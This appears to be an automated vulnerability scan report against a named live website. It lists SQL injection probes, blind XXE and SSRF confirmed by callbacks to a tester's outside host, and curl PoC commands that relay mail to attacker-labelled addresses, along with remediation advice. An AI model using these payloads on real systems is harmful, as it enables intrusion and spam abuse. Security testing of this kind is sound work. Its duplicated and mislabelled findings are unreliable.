# VAPT Report — https://www.infinitycapital.bh/

- Scan `1f5fe7c8-5e28-45bc-8e08-a3e868bad87e` · status **running** · playbook full_coverage_vapt 2.0
- Generated 2026-09-29T23:59:33.065394+00:00

## Executive summary
- **12 findings** (10 high, 2 low).
- **Coverage:** 663/1167 applicable cells resolved (56.8%); 25 attempt-capped; 479 still open.
- **Attack chains:** 21.

## Findings
### [HIGH] Boolean-blind SQL injection in `cb` at https://www.infinitycapital.bh/contact
- sqli · CWE-89 · https://www.infinitycapital.bh/contact
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `https://www.infinitycapital.bh/contact -> `cb' AND 1=1-- -` vs `cb' AND 1=2-- -` yields a stable TRUE/FALSE differential`

### [HIGH] Blind xxe confirmed via OOB callback
- xxe · https://www.infinitycapital.bh/api/
- Why: Embedded an OOB beacon (dns://oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973) in exploit_floor:oob https://www.infinitycapital.bh/api/; the server dereferenced it and called back to the controlled host (interaction dau2p4ghgqag02k5emggc5xu6hph3m973), confirming a blind xxe.
- PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`

### [HIGH] Blind ssrf confirmed via OOB callback
- ssrf · local-control
- Why: Embedded an OOB beacon (dns://oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973) in the `selfcheck` parameter of control local-control; the server dereferenced it and called back to the controlled host (interaction dau2p4ghgqag02k5emggc5xu6hph3m973), confirming a blind ssrf.
- PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`

### [HIGH] Blind ssrf confirmed via OOB callback
- ssrf · local-control
- Why: Embedded an OOB beacon (dns://oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973) in the `selfcheck` parameter of control local-control; the server dereferenced it and called back to the controlled host (interaction dau2p4ghgqag02k5emggc5xu6hph3m973), confirming a blind ssrf.
- PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`

### [HIGH] Blind ssrf confirmed via OOB callback
- ssrf · NEVER-CONTACTED-CONTROL
- Why: Embedded an OOB beacon (dns://ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973) in the `control` parameter of oob-http NEVER-CONTACTED-CONTROL; the server dereferenced it and called back to the controlled host (interaction dau2p4ghgqag02k5emggc5xu6hph3m973), confirming a blind ssrf.
- PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`

### [HIGH] Blind ssrf confirmed via OOB callback
- ssrf · NEVER-CONTACTED-CONTROL
- Why: Embedded an OOB beacon (dns://ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973) in the `control` parameter of oob-http NEVER-CONTACTED-CONTROL; the server dereferenced it and called back to the controlled host (interaction dau2p4ghgqag02k5emggc5xu6hph3m973), confirming a blind ssrf.
- PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`

### [HIGH] Unauthenticated open email relay / spam relay via POST /api/send (attacker-controlled recipient, no auth, no CAPTCHA, no rate limit)
- business_logic · CWE-284 · POST https://www.infinitycapital.bh/api/send
- Why: Confirmed by direct comparison of two requests identical except for the recipient field, which is the cleanest possible proof that recipient control exists. The comma-separated multi-recipient test additionally shows the attacker can fan out to arbitrary numbers of third parties. Note: the "check" honeypot is accepted rather than rejected, confirming bot-mitigation is non-functional. The three "verified*" runs to the OOB host returning message ids confirm reliable reproduction; the message ids are issued by Resend (provider accepted the send).
- PoC: `No cookies, no session, no auth header, no CAPTCHA. Recipient is fully attacker-controlled.

# 1) Baseline - send to the site's own address
$ curl -sk -X POST https://www.infinitycapital.bh/api/send \
   -F "fname=Test" -F "lname=User" -F "areacode=0" -F "tel=123456" \
   -F "cname=probe" -F "subject=Inquiry" -F "msg=baseline two" -F "check=yes" \
   --form-string "targets=info@infinitycapital.bh"
{"data":{"id":"01a0ef49-8f9d-753a-83b4-f7b46db7551e"},"error":null}

# 2) SAME REQUEST, only the recipient changed to an external/third-party address
$ curl -sk -X POST https://www.infinitycapital.bh/api/send \
   ... -F "msg=relay test one" --form-string "targets=attacker@oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
{"data":{"id":"01a0ef49-c120-75f9-907d-5017681474d2"},"error":null}

# 3) Multiple arbitrary recipients via comma in the same field
$ curl -sk -X POST https://www.infinitycapital.bh/api/send ... \
   --form-string "targets=info@infinitycapital.bh, attacker2@oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
{"data":{"id":"01a0ef49-c2c5-74bc-8dc0-89c29f866008"},"error":null}   # accepted

# 4) Honeypot does NOT block: check=1 (should be rejected by a real bot filter)
$ ... -F "check=1" --form-string "targets=info@infinitycapital.bh"
{"data":{"id":"01a0ef4a-59c8-765f-b570-0c1f273e96e0"},"error":null}   # still sent

# 5) No rate limiting - 5 rapid-fire sends, all accepted
200 200 200 200 200

# 6) Repeated 3x to the attacker's own host, all accepted (stable reproduction)
{"data":{"id":"01a0ef4a-5b89-749f-9533-e7d8969940e5"},"error":null}
{"data":{"id":"01a0ef4a-5d39-7555-842c-264ab6036a5d"},"error":null}
{"data":{"id":"01a0ef4a-5edd-716f-be83-95001334a0ac"},"error":null}

Every request returns a real Resend message id, proving the mail was actually handed to the provider for delivery.`
- Fix: 1) Never accept the destination address from the client. Hardcode the recipient server-side (e.g. `to: 'info@infinitycapital.bh'`) and delete the `targets` field from the request handler, so the client cannot influence the envelope recipient at all.
2) If dynamic recipients are genuinely required, validate against a strict server-side allowlist of permitted addresses/domains before calling the provider.
3) Enforce a real anti-automation control: the `check` honeypot must REJECT submissions when present (currently it is accepted, so it provides zero protection). Add rate limiting per IP and per session on /api/send, plus a CAPTCHA/Turnstile for anonymous submissions.
4) Enforce a server-side message size cap (100kB body was accepted) and reject unknown/extra fields (from/replyTo/bcc) rather than passing them through.
5) Add email-authentication alignment (SPF/DKIM/DMARC) and monitor Resend sending volume so relay abuse is detected and the sending domain cannot be used for spam.

### [HIGH] Blind ssrf confirmed via OOB callback
- ssrf · https://www.infinitycapital.bh/api/send
- Why: Embedded an OOB beacon (dns://oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973) in the `targets` parameter of oob-http https://www.infinitycapital.bh/api/send; the server dereferenced it and called back to the controlled host (interaction dau2p4ghgqag02k5emggc5xu6hph3m973), confirming a blind ssrf (agent suspected email_injection).
- PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`

### [HIGH] Boolean-blind SQL injection in `page` at https://www.infinitycapital.bh/
- nosqli · CWE-943 · https://www.infinitycapital.bh/
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `https://www.infinitycapital.bh/ -> `page' AND 1=1-- -` vs `page' AND 1=2-- -` yields a stable TRUE/FALSE differential`

### [HIGH] Boolean-blind SQL injection in `id` at https://www.infinitycapital.bh/api/
- nosqli · CWE-943 · https://www.infinitycapital.bh/api/
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `https://www.infinitycapital.bh/api/ -> `id' AND 1=1-- -` vs `id' AND 1=2-- -` yields a stable TRUE/FALSE differential`

### [LOW] missing security headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy at https://www.infinitycapital.bh
- security_headers · CWE-693 · https://www.infinitycapital.bh
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `curl -sD - https://www.infinitycapital.bh  # missing security headers: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy`
- Suggested config (review before applying):
  ```
  # Add these response headers (nginx example):
  add_header Content-Security-Policy "default-src 'self'; frame-ancestors 'none'; object-src 'none'" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header X-Frame-Options "DENY" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
  add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;
  ```

### [LOW] missing HSTS (Strict-Transport-Security) on an HTTPS origin at https://www.infinitycapital.bh
- protocol · CWE-319 · https://www.infinitycapital.bh
- Why: deterministic weapon detection (S5 exploit floor)
- PoC: `curl -sD - https://www.infinitycapital.bh  # missing HSTS (Strict-Transport-Security) on an HTTPS origin`

## Coverage ledger (what was tested / not tested)
- attempted: 25
- blocked: 16
- confirmed: 18
- na: 2196
- tested_clean: 629
- testing: 444
- untested: 35

## Attack chains (what an attacker can chain)
### Candidate / reachability (not executed end-to-end)
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → metadata_access: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
- Chain: internal_http → internal_http → internal_http → internal_http → metadata_access
  - internal_http — https://www.infinitycapital.bh/api/ · PoC: `OOB callback oob17aecfd7c311.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.804324+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — https://www.infinitycapital.bh/api/send · PoC: `OOB callback oobdc3afb3004d6.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T22:29:51.136357+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — local-control · PoC: `OOB callback oob571a47f26f8c.dau2p4ghgqag02k5emggc5xu6hph3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:32:25.811980+00:00`
  - internal_http → internal_http: In-network HTTP reach lets the SSRF probe internal-only services an external caller could never route to. — NEVER-CONTACTED-CONTROL · PoC: `OOB callback ooBB3F20F27D3B3.daU2P4GhgqAg02K5eMGgC5xU6hPh3m973 interaction dau2p4ghgqag02k5emggc5xu6hph3m973 at 2026-09-29T21:49:01.101997+00:00`
